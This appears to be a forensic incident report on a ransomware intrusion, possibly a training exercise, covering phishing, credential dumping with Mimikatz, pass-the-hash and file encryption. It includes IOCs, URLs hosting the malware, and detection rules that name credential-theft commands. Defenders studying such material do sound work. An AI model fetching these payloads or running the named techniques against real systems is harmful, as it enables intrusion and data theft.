This section provides a detailed chronological reconstruction of the attack, documenting each significant event from initial phishing email through ransomware execution. The timeline was reconstructed from Sysmon event logs, Splunk aggregated data, and network packet captures.

The attack can be divided into four distinct phases:
1. **Initial Access (01:36-01:40):** Phishing email, document exploitation, UAC bypass, C2 establishment
2. **Reconnaissance & Credential Theft (02:16-02:22):** Tool staging, Mimikatz execution, hash theft
3. **Lateral Movement (02:22-02:24):** Pass-the-Hash to Domain Controller
4. **Objective Execution (02:34-02:55):** Defense evasion, ransomware deployment on File Server

The total attack duration from initial email access to ransomware execution was approximately **58 minutes**, demonstrating the attacker's efficiency and suggesting pre-planned procedures.

### Detailed Timeline (December 18, 2025 - UTC+8)

| Time | Host | Activity | MITRE |
|------|------|----------|-------|
| 01:36:45 | WS-01-CORP | User opens phishing email attachment (Proposal_Client.docx) | T1566.001 |
| 01:37:36 | WS-01-CORP | Additional attachment saved (YEAR-END-FINANCIAL-REPORT-2025.docx) | T1566.001 |
| 01:37:47 | WS-01-CORP | Malicious document opened, fetches remote template | T1221 |
| 01:38:11 | WS-01-CORP | Reference.docm downloaded from GitHub | T1221 |
| 01:38:24 | WS-01-CORP | Document_Open() macro auto-executes | T1204.002 |
| 01:39:34 | WS-01-CORP | UAC bypass payload downloaded via TinyURL | T1548.002 |
| 01:39:48 | WS-01-CORP | EventViewerRCE.ps1 and p4yl0ad created | T1548.002 |
| 01:40:09 | WS-01-CORP | **C2 beacon (explorer.exe) executed with elevated privileges** | T1059.001 |
| 02:16:36 | WS-01-CORP | BrocaArea.ps1 downloaded (first attempt) | T1105 |
| 02:17:00 | WS-01-CORP | Ransomware execution attempt (failed) | T1486 |
| 02:19:33 | WS-01-CORP | Neurotransmitter.exe (Mimikatz) downloaded | T1105 |
| 02:19:57 | WS-01-CORP | Credential dumping: lsadump::lsa /inject | T1003.004 |
| 02:20:04 | WS-01-CORP | Credential dumping: sekurlsa::logonpasswords | T1003.001 |
| 02:20:12 | WS-01-CORP | Brainstemo.exe (PsExec) downloaded | T1105 |
| 02:20:32 | WS-01-CORP | Salad.zip (NetExec) downloaded | T1105 |
| 02:21:03 | WS-01-CORP | nxc.exe renamed to Salad.exe | T1036 |
| 02:21:59 | WS-01-CORP | Service enumeration: sc query type= service | T1007 |
| 02:22:20 | WS-01-CORP | Domain enumeration: nslookup corp.local | T1018 |
| 02:22:27 | WS-01-CORP | Cerebrum.ps1 (Pass-the-Hash) downloaded | T1105 |
| 02:22:50 | WS-01-CORP | **Pass-the-Hash attack launched against AD-CORP** | T1550.002 |
| 02:22:52 | AD-CORP | WmiPrvSE.exe spawns obfuscated PowerShell | T1047 |
| 02:23:10 | AD-CORP | **Domain Controller compromised** - C2 beacon executed | T1059.001 |
| 02:23:42 | AD-CORP | Privilege enumeration: whoami /priv | T1033 |
| 02:24:09 | AD-CORP | Domain user enumeration: net user | T1087.002 |
| 02:34:05 | FS-CORP | **Splunk Forwarder stopped** (defense evasion) | T1562.001 |
| 02:34:19 | FS-CORP | BrocaArea.ps1 downloaded | T1105 |
| 02:34:49 | FS-CORP | **RANSOMWARE EXECUTED** - D:\ drive encrypted | T1486 |
| 02:39:26 | FS-CORP | Drive enumeration: wmic logicaldisk | T1082 |
| 02:39:48 | FS-CORP | Directory listing: dir D:\ | T1083 |
| 02:55:28 | WS-01-CORP | Process injection into PowerShell | T1055.001 |

---

## Evidence Analysis

This section documents the evidence sources used to reconstruct the attack timeline and provides detailed analysis of key findings from each source. The combination of multiple evidence types enabled comprehensive visibility into the attack despite the attacker's defense evasion efforts.

### Evidence Sources

| Source | Type | Location | Relevance |
|--------|------|----------|-----------|
| Sysmon Event Logs | EVTX | FS-CORP-Sysmon.evtx | Process creation, file creation, network connections |
| Splunk Logs | JSON | all-search-splunk.json | Comprehensive timeline across all hosts |
| Network Capture | PCAP | FS-pcap.pcapng | C2 traffic, exfiltration analysis |
| Malware Sample | PE | explorer.exe | C2 beacon analysis |
| Macro Document | DOCM | Reference.docm | Initial access vector |

**Sysmon Event Logs (FS-CORP-Sysmon.evtx):**
Sysmon logging on the File Server captured critical events including process creation (EventCode 1), network connections (EventCode 3), and file creation (EventCode 11). Even though the Splunk Forwarder was stopped, local Sysmon logs on FS-CORP preserved evidence of ransomware execution and the commands that preceded it.

**Splunk Aggregated Logs (all-search-splunk.json):**
The centralized Splunk instance received logs from all systems prior to the Forwarder termination on FS-CORP. This provided a comprehensive cross-system view of the attack, enabling correlation of activities across WS-01-CORP, AD-CORP, and FS-CORP. The Splunk data was critical for establishing the complete timeline and identifying lateral movement.

**Network Capture (FS-pcap.pcapng):**
Packet capture on the network provided visibility into C2 communications that would not be visible in host-based logs. This evidence source confirmed the C2 server IP, communication patterns, and data exfiltration volume.

**Malware Samples:**
Recovery and analysis of the C2 beacon (explorer.exe) and macro document (Reference.docm) provided deep technical insight into the attacker's capabilities, infrastructure, and operational procedures.

### Network Traffic Analysis (PCAP)

Analysis of the network packet capture revealed extensive command-and-control communications and significant data exfiltration:

| Metric | Value |
|--------|-------|
| **Total C2 Traffic** | ~103 MB |
| **C2 Server** | 209.97.175.18 |
| **Primary Port** | 443 (HTTPS) |
| **Exfiltration Port** | 7219 |
| **Beacon Interval** | 5 seconds |
| **SSL Certificate** | Self-signed |

**Key PCAP Findings:**

1. **C2 Communication Pattern:** The beacon maintained consistent 5-second check-in intervals with the C2 server, creating a predictable network pattern that could be used for future detection.

2. **Data Exfiltration Confirmed:** Approximately 103 MB of data was transferred outbound to the C2 server, primarily over port 7219. The volume and timing suggest targeted data extraction prior to ransomware deployment.

3. **SSL/TLS Usage:** While the C2 communication used HTTPS (port 443), the self-signed certificate and disabled certificate validation in the malware create opportunities for network-based detection and potentially interception.

4. **Multiple Victim Connections:** Network analysis confirmed C2 connections from all three compromised hosts, verifying the successful lateral movement to AD-CORP and FS-CORP.

### Splunk Query Examples

```spl
# Identify C2 beacon execution
index=* EventCode=1 Image="*\\explorer.exe" ParentImage="*\\powershell.exe"
| stats count by _time, host, User, CommandLine

# Detect credential dumping
index=* EventCode=1 (CommandLine="*lsadump*" OR CommandLine="*sekurlsa*")
| table _time, host, User, CommandLine

# Ransomware activity
index=* EventCode=1 CommandLine="*Invoke-Broca*"
| table _time, host, User, CommandLine

# Defense evasion - service stop
index=* EventCode=1 CommandLine="*stop*Splunk*"
| table _time, host, User, CommandLine
```

---

## Indicators of Compromise (IOCs)

### File Hashes

| File Path | SHA256 | Purpose |
|-----------|--------|---------|
| `C:\Users\Public\explorer.exe` | `59CEBD35102C4164A6CA164B6BDA97AFE56984CB35C3F572A66343F774474542` | C2 Beacon/RAT |
| `C:\Windows\Tasks\EventViewerRCE.ps1` | `63F62D1A255E37C3551000FDA3D3A2777C0846C50AA025A241AFC2A75604E5EE` | UAC bypass trigger script |
| `C:\Windows\Temp\Neurotransmitter.exe` | `92804FAAAB2175DC501D73E814663058C78C0A042675A8937266357BCFB96C50` | Mimikatz (credential dumping) |
| `C:\Windows\Temp\Cerebrum.ps1` | `4fd1191c8034127a6484bcd362d30353b56887267c3652cf6f80864b192238fe` | Pass-the-Hash tool (SMBExec variant) |
| `C:\Windows\Temp\BrocaArea.ps1` | `15f6139c8bd52c8af0eec10a5824c3dba3058e3dd1b76a08d27e4e0426fa446c` | Ransomware (file encryptor) |
| `C:\Windows\Temp\Brainstemo.exe` | `EDFAE1A69522F87B12C6DAC3225D930E4848832E3C551EE1E7D31736BF4525EF` | Sysinternals PsExec (renamed) - Staged at 02:20:12 but not executed (see Complete Attack Tool Behavior Analysis section) |
| `Proposal_Client.docx` | `C97B7CCFB4464D8F57EE250C7EE894FBB4D77C8068486FFBC6C39EB247AECBBB` | Decoy document (first attachment) |
| `YEAR-END-FINANCIAL-REPORT-2025.docx` | `c3337074a81cb59e7db78087ded4b35dd89efddebd2bea8a8379748e5a58b1f3` | Weaponized document with Remote Template Injection |
| `C:\Users\FAKHRI~1.ZAM\AppData\Local\Temp\xvzpox75.txt` | `e2dd5d13ef50e3232abce5b0786740c5d0d3c03414c479aee85ecb65f10887af` | Base64-encoded malware staging file |

### Network Indicators

| Type | Indicator | Description |
|------|-----------|-------------|
| IP Address | 209.97.175.18 | C2 Server |
| Port | 443 | C2 Communication (HTTPS) |
| Port | 7219 | Data Exfiltration |
| Domain | corp.local | Target Domain |

### URL Indicators

| URL | Purpose |
|-----|---------|
| `github.com/TomatoTerbang/fluffy-umbrella/raw/refs/heads/main/Reference.docm` | Malicious macro template |
| `raw.githubusercontent.com/TomatoTerbang/fluffy-umbrella/refs/heads/main/rainingdroplets.txt` | C2 beacon payload (part 1) |
| `raw.githubusercontent.com/TomatoTerbang/fluffy-umbrella/refs/heads/main/windyseasons.txt` | C2 beacon payload (part 2) |
| `github.com/TomatoTerbang/BrainRil/raw/refs/heads/main/BrocaArea` | Ransomware module |
| `github.com/TomatoTerbang/BrainRil/raw/refs/heads/main/Neurotransmitter` | Mimikatz |
| `github.com/TomatoTerbang/BrainRil/raw/refs/heads/main/Cerebrum` | Pass-the-Hash tool |
| `github.com/TomatoTerbang/BrainRil/raw/refs/heads/main/Brainstemo` | PsExec |
| `tinyurl.com/4kaz75ds` | UAC bypass payload |

### File Path Indicators

| Path | Description |
|------|-------------|
| `C:\Users\Public\explorer.exe` | C2 beacon location |
| `C:\Windows\Tasks\EventViewerRCE.ps1` | UAC bypass script |
| `C:\Windows\Tasks\p4yl0ad` | .NET gadget chain |
| `C:\Windows\Temp\Cerebrum.ps1` | Pass-the-Hash tool |
| `C:\Windows\Temp\BrocaArea.ps1` | Ransomware module |
| `C:\Windows\Temp\Neurotransmitter.exe` | Mimikatz |
| `C:\Windows\Temp\Brainstemo.exe` | PsExec |
| `C:\Windows\Temp\Salad.exe` | NetExec |
| `C:\ProgramData\greenlight.dat` | Ransomware completion marker |

### Credential Indicators

| Account | NTLM Hash | Status |
|---------|-----------|--------|
| itdadmin | 7cd2184b08d975c26b0368cb3ef4edee | **COMPROMISED** |

### Mutex

| Mutex | Purpose |
|-------|---------|
| 51F98B5B-ED19-F7D5-283E-B46984E8FA69A | C2 beacon single-instance check |

### Encryption Configuration (C2 Config)

| Component | Base64 Value |
|-----------|--------------|
| AES Key | wWrx+62b7++4exaVvcwZRy3QNnd+KBGuEZcW46Ho6E4= |
| AES IV | ERQOOQ4Cz2cyehEUrqfhLA== |
| XOR Key (Macro) | Qx9Zp2Lm |

---

## MITRE ATT&CK Mapping

### Tactics and Techniques Used

| Tactic | Technique ID | Technique Name | Evidence |
|--------|--------------|----------------|----------|
| **Initial Access** | T1566.001 | Phishing: Spearphishing Attachment | Malicious email attachments |
| **Initial Access** | T1221 | Template Injection | Reference.docm fetched remotely |
| **Execution** | T1204.002 | User Execution: Malicious File | User opened weaponized document |
| **Execution** | T1059.001 | PowerShell | Extensive PowerShell usage |
| **Execution** | T1059.005 | Visual Basic | VBA macro in Reference.docm |
| **Execution** | T1047 | Windows Management Instrumentation | WMI for lateral movement |
| **Persistence** | T1547.001 | Registry Run Keys | C2 beacon persistence |
| **Privilege Escalation** | T1548.002 | Bypass User Account Control | Event Viewer exploitation |
| **Defense Evasion** | T1562.001 | Impair Defenses: Disable or Modify Tools | Stopped Splunk Forwarder |
| **Defense Evasion** | T1140 | Deobfuscate/Decode Files | Base64, XOR, deflate decoding |
| **Defense Evasion** | T1036.005 | Masquerading | PsExec → Brainstemo.exe |
| **Defense Evasion** | T1027 | Obfuscated Files or Information | .NET Reactor, function name obfuscation |
| **Credential Access** | T1003.001 | OS Credential Dumping: LSASS Memory | Mimikatz sekurlsa::logonpasswords |
| **Credential Access** | T1003.004 | OS Credential Dumping: LSA Secrets | Mimikatz lsadump::lsa |
| **Discovery** | T1082 | System Information Discovery | whoami, hostname, wmic |
| **Discovery** | T1083 | File and Directory Discovery | dir, Get-ChildItem |
| **Discovery** | T1087.002 | Account Discovery: Domain Account | net user |
| **Discovery** | T1007 | System Service Discovery | sc query |
| **Discovery** | T1018 | Remote System Discovery | nslookup |
| **Lateral Movement** | T1550.002 | Pass the Hash | Cerebrum.ps1 Invoke-LargeBrain |
| **Collection** | T1005 | Data from Local System | File enumeration on FS-CORP |
| **Exfiltration** | T1041 | Exfiltration Over C2 Channel | 103 MB via C2 |
| **Command and Control** | T1071.001 | Application Layer Protocol: Web Protocols | HTTPS to 209.97.175.18:443 |
| **Command and Control** | T1573.001 | Encrypted Channel: Symmetric Cryptography | AES-256-CBC |
| **Command and Control** | T1571 | Non-Standard Port | Port 7219 |
| **Impact** | T1486 | Data Encrypted for Impact | .anon ransomware |

---

## Impact Assessment

This section provides a comprehensive evaluation of the incident's impact across multiple dimensions: business operations, data integrity, system availability, and regulatory compliance.

### Business Impact

The ransomware attack has had significant and multi-faceted impacts on Corp Bhd.'s operations:

| Category | Impact Level | Description |
|----------|--------------|-------------|
| **Data Availability** | Critical | FS-CORP D:\ drive encrypted; banking documents inaccessible |
| **Data Confidentiality** | High | 103 MB data exfiltrated; potential data breach |
| **System Integrity** | Critical | 3 of 4 systems fully compromised |
| **Operations** | High | File server offline; business disruption |
| **Reputation** | Medium | Potential regulatory notification required |

**Data Availability - CRITICAL:**
The encryption of the File Server's D:\ drive has rendered all stored documents inaccessible. This includes critical banking documents, financial reports, and business records that are essential for daily operations. Until data is restored from backup, affected business processes will be significantly impaired or completely halted.

**Data Confidentiality - HIGH:**
PCAP analysis confirmed that approximately 103 MB of data was exfiltrated to the C2 server (209.97.175.18) over port 7219 before encryption. The nature and sensitivity of exfiltrated data is currently being assessed. This potential data breach may trigger notification requirements under applicable data protection regulations.

**System Integrity - CRITICAL:**
Three of four critical systems suffered complete compromise:
- The Domain Controller compromise means the attacker had full control over Active Directory, potentially allowing creation of backdoor accounts or modification of security policies
- The workstation and file server both had malware installed and were under active C2 control
- The integrity of all data and configurations on compromised systems cannot be trusted without complete rebuild

**Operational Impact - HIGH:**
The file server being offline directly impacts business operations. Any workflows dependent on centralized file storage, document collaboration, or access to historical records are currently non-functional. The duration of this impact depends on successful backup restoration.

### Systems Impact Summary

| System | Integrity | Availability | Confidentiality |
|--------|-----------|--------------|-----------------|
| WS-01-CORP | Compromised | Available | Data exposed |
| AD-CORP | Compromised | Available | Domain admin access stolen |
| FS-CORP | Compromised | **Unavailable** | Data encrypted + exfiltrated |
| BCKP-CORP | **Intact** | **Available** | **Secure** |

### Data Impact

- **Encrypted Files:** All files on FS-CORP D:\ drive (.anon extension)
- **Exfiltrated Data:** ~103 MB (verified via PCAP)
- **File Types Affected:** Banking documents, financial reports

---

## Root Cause Analysis

A thorough root cause analysis is essential to understanding not just what happened, but why the attack was successful and how similar incidents can be prevented in the future. This analysis examines the technical, procedural, and organizational factors that contributed to the incident.

### Primary Causes

The following factors were identified as primary contributors to the successful attack:

| Factor | Description | Contribution |
|--------|-------------|--------------|
| **User Action** | User opened malicious email attachment without verification | Direct |
| **Email Security Gap** | Malicious attachment not blocked by email gateway | Contributing |
| **Missing EDR** | C2 beacon and Mimikatz not detected by endpoint protection | Contributing |
| **Privileged Access** | Domain admin credentials cached on workstation | Critical |
| **Network Segmentation** | Workstation could directly access DC via WMI | Critical |
| **Monitoring Gap** | Splunk Forwarder was stopped without alert | Contributing |

**User Action (Direct Cause):**
The attack was ultimately enabled by a user opening a malicious email attachment. While security awareness training can reduce this risk, it cannot eliminate it entirely. Users will inevitably make mistakes, especially when social engineering is sophisticated and contextually relevant (e.g., "YEAR-END-FINANCIAL-REPORT" during year-end business activities).

**Email Security Gap (Contributing):**
The Remote Template Injection technique successfully bypassed email security controls. The initial document (YEAR-END-FINANCIAL-REPORT-2025.docx) contained no malicious macros or code—only a hidden reference to an external template. This evasion technique exploits a gap in many email security solutions that focus on detecting malicious content rather than external references.

**Missing EDR (Contributing):**
The absence of or ineffective Endpoint Detection and Response (EDR) capability allowed multiple malicious activities to proceed undetected:
- The C2 beacon executed and maintained persistent access
- Mimikatz (Neurotransmitter.exe) ran and dumped credentials from LSASS
- PowerShell-based attacks executed without behavioral detection

**Privileged Access Management (Critical):**
The presence of domain administrator credentials (itdadmin) cached on a standard user workstation was a critical security gap. When the attacker compromised WS-01-CORP, they gained access to credentials that allowed them to compromise the entire domain. In a properly segmented environment with credential tiering, domain admin credentials would never be cached on non-privileged systems.

**Network Segmentation (Critical):**
The lack of network segmentation allowed the compromised workstation to directly communicate with the Domain Controller via WMI and SMB. In a segmented network, workstations would not have direct access to domain controllers, and lateral movement would require traversing monitored network boundaries.

**Monitoring Gap (Contributing):**
The attacker was able to stop the Splunk Forwarder service on FS-CORP without generating an alert. Security-critical services should be monitored for status changes, and service termination should trigger immediate investigation.

### Attack Success Factors

Beyond the root causes, several tactical factors contributed to the attack's success:

1. **Remote Template Injection** effectively bypassed email attachment scanning by hosting the malicious macro externally, exploiting the gap between attachment analysis and runtime behavior

2. **UAC Bypass via Event Viewer** achieved administrative privileges without triggering a UAC prompt, eliminating a potential warning sign that might have alerted the user

3. **NTLM Hash Theft** enabled credential reuse without knowing the actual password, leveraging a fundamental weakness in Windows authentication that persists across modern Windows versions

4. **WMI-based Lateral Movement** avoided deploying services or executables that might trigger detection, using legitimate Windows infrastructure for malicious purposes

5. **Deliberate Defense Evasion** - stopping the Splunk Forwarder demonstrated operational awareness and prevented real-time alerting during the most critical attack phase

6. **Rapid Execution** - completing the entire attack chain in 58 minutes left minimal time for detection and response, suggesting pre-planned and rehearsed procedures

---

## Response and Recovery

This section outlines the immediate response actions required to contain the threat, eradicate the malware, and restore normal operations. Actions are prioritized based on their criticality to stopping ongoing damage and enabling recovery.

### Immediate Containment Actions

Containment is the first priority in incident response. The goal is to prevent the threat actor from causing additional damage while preserving evidence for forensic analysis.

| Priority | Action | Status |
|----------|--------|--------|
| 1 | Block C2 IP `209.97.175.18` at perimeter firewall | Required |
| 2 | Block GitHub repositories (TomatoTerbang/*) | Required |
| 3 | Isolate WS-01-CORP, AD-CORP, FS-CORP from network | Required |
| 4 | Implement VLAN segmentation for affected systems | Required |
| 5 | Preserve forensic evidence before remediation | Required |

**Network-Level Containment:**

Immediate firewall rules should be implemented to block all communications with the identified C2 infrastructure. This includes:
- Block outbound connections to 209.97.175.18 on all ports (particularly 443 and 7219)
- Block access to github.com/TomatoTerbang/* repositories to prevent additional tool downloads
- Block the TinyURL redirect (tinyurl.com/4kaz75ds) used for UAC bypass delivery

**System Isolation:**

All three compromised systems (WS-01-CORP, AD-CORP, FS-CORP) should be immediately isolated from the network through VLAN segmentation. This prevents:
- Further lateral movement by the attacker
- Additional data exfiltration
- Communication with the C2 server
- Potential for the attacker to detect the incident response and take destructive action

**Evidence Preservation:**

Before any remediation activities, forensic images should be captured from all affected systems. This evidence will be critical for:
- Complete attack reconstruction
- Potential law enforcement involvement
- Insurance claims documentation
- Post-incident lessons learned

### Malware Removal

Once containment is achieved, eradication efforts can begin. All identified malicious files must be removed from compromised systems. However, given the extent of the compromise, full system rebuilds are recommended rather than attempting to clean infected systems.

| Location | File | Action |
|----------|------|--------|
| `C:\Users\Public\` | `explorer.exe` | Remove |
| `C:\Windows\Tasks\` | `EventViewerRCE.ps1` | Remove |
| `C:\Windows\Tasks\` | `p4yl0ad` | Remove |
| `C:\Windows\Temp\` | `Cerebrum.ps1` | Remove |
| `C:\Windows\Temp\` | `BrocaArea.ps1` | Remove |
| `C:\Windows\Temp\` | `Neurotransmitter.exe` | Remove |
| `C:\Windows\Temp\` | `Brainstemo.exe` | Remove |
| `C:\Windows\Temp\` | `Salad.exe` | Remove |
| `C:\ProgramData\` | `greenlight.dat` | Remove |

**Important Considerations:**

1. **Persistence Mechanisms:** The C2 beacon may have established additional persistence mechanisms beyond the known files. A full system rebuild is the only way to ensure complete eradication.

2. **Hidden Backdoors:** Given the Domain Controller was compromised, the attacker may have created hidden accounts, modified Group Policy Objects, or installed additional backdoors in Active Directory. A complete AD security audit is essential.

3. **Verification:** After any cleanup activities, secondary scans using updated antivirus signatures and behavioral analysis should confirm no remnants persist.

4. **File Hashes:** Use the SHA256 hashes provided in the IOC section to create detection rules and verify complete removal across all systems.

### Credential Reset

Given the confirmed credential theft and Domain Controller compromise, a comprehensive credential reset is essential. The attacker's access to `itdadmin` (domain administrator) means they potentially had full control over Active Directory, including the ability to create additional accounts or modify existing ones.

| Account | Priority | Action | Timeline |
|---------|----------|--------|----------|
| itdadmin | **Critical** | Immediate password reset, review all activities | 0-4 hours |
| fakhri.zambri | High | Password reset, session termination | 0-4 hours |
| All domain admins | High | Rotate all privileged passwords | 24 hours |
| All domain users | Medium | Phased password reset | 7 days |

**Credential Reset Strategy:**

1. **Immediate Priority (0-4 hours):** Reset the `itdadmin` and `fakhri.zambri` accounts immediately. Terminate all active sessions for these accounts. Review all recent authentication and activity logs for any signs of additional compromise.

2. **Domain Administrators (24 hours):** All domain administrator accounts should have their passwords rotated within 24 hours. Consider implementing temporary restrictions on privileged account usage until the full scope of compromise is understood.

3. **Service Accounts:** Review all service accounts, particularly those with elevated privileges. If any service account passwords are stored on compromised systems, those accounts should be rotated.

4. **Kerberos Tickets:** With Domain Controller compromise, consider resetting the KRBTGT account password twice (with appropriate waiting period) to invalidate any Golden Tickets that may have been created.

5. **Domain Users (7 days):** Implement a phased password reset for all domain users. This can be accomplished through a forced password change policy at next logon.

### System Recovery

Given the depth of compromise on all three affected systems, complete rebuilds are strongly recommended over attempting to clean the existing installations. Cleaning a system that has been fully compromised by a sophisticated attacker leaves significant risk of undetected persistence mechanisms.

| System | Recommended Action | Timeline |
|--------|-------------------|----------|
| WS-01-CORP | Reimage from clean baseline | 24-48 hours |
| AD-CORP | Rebuild or restore from verified pre-attack backup | 48-72 hours |
| FS-CORP | Reimage OS; restore data from BCKP-CORP | 48-72 hours |

**WS-01-CORP Recovery:**
Reimage the workstation from a known-clean baseline image. Before returning to production, ensure the system is updated with all current security patches and equipped with enhanced monitoring capabilities.

**AD-CORP Recovery:**
Domain Controller recovery is the most complex and critical operation. Options include:
- Restore from a verified pre-attack backup (if available and confirmed uncompromised)
- Complete AD rebuild (most secure but most time-intensive)
- Careful cleanup with comprehensive security audit (highest risk of missed persistence)

Given the criticality of Active Directory, engaging specialized AD security consultants is recommended.

**FS-CORP Recovery:**
The operating system partition should be reimaged from a clean baseline. The encrypted data on D:\ should be restored from backup stored on BCKP-CORP (confirmed uncompromised).

### Data Restoration

The successful recovery of encrypted data depends entirely on the availability and integrity of backups. The confirmation that BCKP-CORP was not compromised provides a viable restoration path.

**Data Restoration Procedure:**

1. **Verify Backup Integrity:** Before any restoration, verify that backups on BCKP-CORP are intact and have not been tampered with. Compare checksums against known-good values if available.

2. **Validate Backup Timing:** Confirm that available backups predate the attack (before 02:34:49 on December 18, 2025). Any backups taken after ransomware execution would contain encrypted files.

3. **Staged Restoration:** Restore data in stages, prioritizing critical business operations. Verify each restored dataset before proceeding to the next.

4. **Integrity Verification:** After restoration, perform integrity checks on restored files using cryptographic hashing (SHA-256) where baseline hashes are available.

5. **Access Control Review:** Before returning restored data to production, review and verify file permissions to ensure no unauthorized access was introduced.

---

## Recommendations and Remediation

### Immediate Actions (0-7 Days)

| Priority | Recommendation | Owner | Timeline |
|----------|----------------|-------|----------|
| 1 | Block all IOCs at perimeter firewall | Network Team | Immediate |
| 2 | Reset all compromised credentials | IT Security | 0-4 hours |
| 3 | Isolate and preserve evidence | DFIR Team | 0-8 hours |
| 4 | Deploy detection rules for identified IOCs | SOC | 24 hours |
| 5 | Conduct full malware scan with updated signatures | IT Operations | 48 hours |
| 6 | Restore FS-CORP data from backup | IT Operations | 48-72 hours |

### Short-Term Actions (1-4 Weeks)

| Recommendation | Description |
|----------------|-------------|
| Enable PowerShell Constrained Language Mode | Limit PowerShell capabilities on workstations |
| Block execution from high-risk paths | `C:\Users\Public\`, `C:\Windows\Tasks\` |
| Enable Script Block Logging | Full PowerShell execution logging |
| Deploy enhanced email filtering | Implement sandboxing for attachments |
| Implement network segmentation | Isolate workstations from critical servers |

### Long-Term Actions (1-3 Months)

| Recommendation | Description |
|----------------|-------------|
| Deploy EDR solution | Behavioral analysis and threat detection |
| Implement Privileged Access Management (PAM) | Credential tiering, just-in-time access |
| Adopt Zero Trust Architecture | Continuous verification, least privilege |
| Conduct phishing awareness training | Regular simulations and education |
| Implement immutable backups | Air-gapped or cloud-based backup solution |
| Enable LSASS protection | Credential Guard, PPL |

### Detection Rules

```yaml
title: BrainRil Pass-the-Hash Tool Detection
status: experimental
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    CommandLine|contains:
      - 'Invoke-LargeBrain'
      - 'Cerebrum.ps1'
      - '-hash'
  condition: selection
---
title: BrainRil Ransomware Detection  
status: experimental
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    CommandLine|contains:
      - 'Invoke-Broca'
      - 'BrocaArea.ps1'
  condition: selection
---
title: Splunk Forwarder Defense Evasion
status: experimental
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    CommandLine|contains:
      - 'stop SplunkForwarder'
      - 'Stop-Service Splunk'
  condition: selection
---
title: Malicious Explorer.exe from Non-Standard Location
status: experimental
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    Image|endswith: '\explorer.exe'
  filter:
    Image|startswith: 'C:\Windows\'
  condition: selection and not filter
```

---

## Lessons Learned

Every security incident, while damaging, provides valuable insights for improving an organization's security posture. This section analyzes the gaps exposed by this incident and provides actionable recommendations for improvement.

### Gap Analysis

The following table summarizes the security gaps identified through this incident and provides specific recommendations for addressing each:

| Gap | Finding | Recommendation |
|-----|---------|----------------|
| Email Security | Malicious attachment not blocked | Implement email sandboxing and attachment analysis |
| User Awareness | User opened suspicious attachment | Conduct phishing awareness training |
| Endpoint Protection | Malware not detected | Deploy EDR with behavioral analysis |
| Network Segmentation | Workstation accessed DC directly | Implement network segmentation |
| Privileged Access | Admin hash easily stolen | Implement PAM and credential tiering |
| Monitoring Response | 42-minute gap before lateral movement | Enhance real-time alerting |
| Defense Evasion | Splunk stopped without alert | Monitor security service status |

**Email Security Gap:**
The Remote Template Injection technique successfully bypassed email security by hosting malicious content externally. Traditional attachment scanning was insufficient. Organizations should implement:
- Sandboxing solutions that execute documents in isolated environments
- Analysis of external references within documents
- Blocking or alerting on documents that fetch remote content

**User Awareness Gap:**
Despite the sophisticated delivery mechanism, a more security-aware user might have questioned the unsolicited financial document or noticed unusual Word behavior when the template was fetched. Regular phishing simulations and training on recognizing social engineering can reduce (though never eliminate) this risk.

**Endpoint Protection Gap:**
Multiple highly malicious activities occurred without detection:
- Mimikatz execution (well-known credential theft tool)
- C2 beacon communication
- UAC bypass exploitation
- PowerShell-based attacks

Modern Endpoint Detection and Response (EDR) solutions with behavioral analysis capabilities are essential for detecting these advanced techniques.

**Network Segmentation Gap:**
The flat network architecture allowed the compromised workstation to directly access the Domain Controller via WMI. Implementing proper network segmentation would:
- Require lateral movement to traverse monitored boundaries
- Enable detection at network chokepoints
- Limit the blast radius of any single compromise

**Privileged Access Gap:**
The presence of domain admin credentials on a standard workstation was a critical failure. Implementing Privileged Access Management (PAM) would include:
- Credential tiering (admin credentials never on workstations)
- Just-in-time access for privileged operations
- Dedicated Privileged Access Workstations (PAWs) for administrative tasks

### What Worked

Despite the successful attack, several security measures provided value:

- **Sysmon Logging:** Comprehensive process creation logging captured detailed attack artifacts, enabling complete attack reconstruction
- **Splunk Log Aggregation:** Centralized logging preserved evidence even after the forwarder was stopped on FS-CORP
- **Network Capture:** PCAP data provided visibility into C2 communications and data exfiltration
- **BCKP-CORP Security:** The backup server remained uncompromised, providing a viable data recovery path
- **Post-Incident Investigation:** The DFIR team successfully reconstructed the complete attack chain

### What Failed

The following security measures failed to prevent or detect the attack:

- **Email Security:** Did not detect Remote Template Injection technique
- **UAC Protection:** UAC bypass via Event Viewer succeeded without detection or prevention
- **Credential Protection:** Mimikatz executed successfully, extracting NTLM hashes from LSASS
- **Lateral Movement Detection:** WMI-based lateral movement was not blocked or alerted
- **Real-Time Alerting:** Ransomware executed before containment could be initiated
- **Service Monitoring:** Splunk Forwarder termination did not trigger an alert

---

## Annexes

### Annex A: Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         CORP BHD. RANSOMWARE ATTACK FLOW                    │
└─────────────────────────────────────────────────────────────────────────────┘

  PHASE 1: INITIAL ACCESS                                        WS-01-CORP
  ─────────────────────────────────────────────────────────────────────────
    [01:36:45] ──► User receives phishing email with attachments
                   │
                   ▼
    [01:37:47] ──► Opens YEAR-END-FINANCIAL-REPORT-2025.docx
                   │
                   ▼
    [01:38:11] ──► Word fetches Reference.docm from GitHub (T1221)
                   │
                   ▼
    [01:39:48] ──► UAC Bypass via Event Viewer
                   │
                   ▼
    [01:40:09] ──► C2 beacon connects to 209.97.175.18:443
                   (WITH ELEVATED PRIVILEGES)

  PHASE 2: CREDENTIAL THEFT                                      WS-01-CORP
  ─────────────────────────────────────────────────────────────────────────
    [02:19:57] ──► Mimikatz extracts credentials
                   │
                   └──► itdadmin NTLM: 7cd2184b08d975c26b0368cb3ef4edee

  PHASE 3: LATERAL MOVEMENT                            WS-01-CORP → AD-CORP
  ─────────────────────────────────────────────────────────────────────────
    [02:22:50] ──► Pass-the-Hash via WMI (Invoke-LargeBrain)
                   │
                   ▼
    [02:23:10] ──► Domain Controller compromised

  PHASE 4: RANSOMWARE                                               FS-CORP
  ─────────────────────────────────────────────────────────────────────────
    [02:34:05] ──► Splunk Forwarder stopped (defense evasion)
                   │
                   ▼
    [02:34:49] ──► Invoke-Broca ransomware executed
                   │
                   ▼
               ┌──────────────────────────┐
               │   D:\ DRIVE ENCRYPTED    │
               │   All files → .anon      │
               └──────────────────────────┘

  SUMMARY
  ─────────────────────────────────────────────────────────────────────────
    Total Time:      ~58 minutes
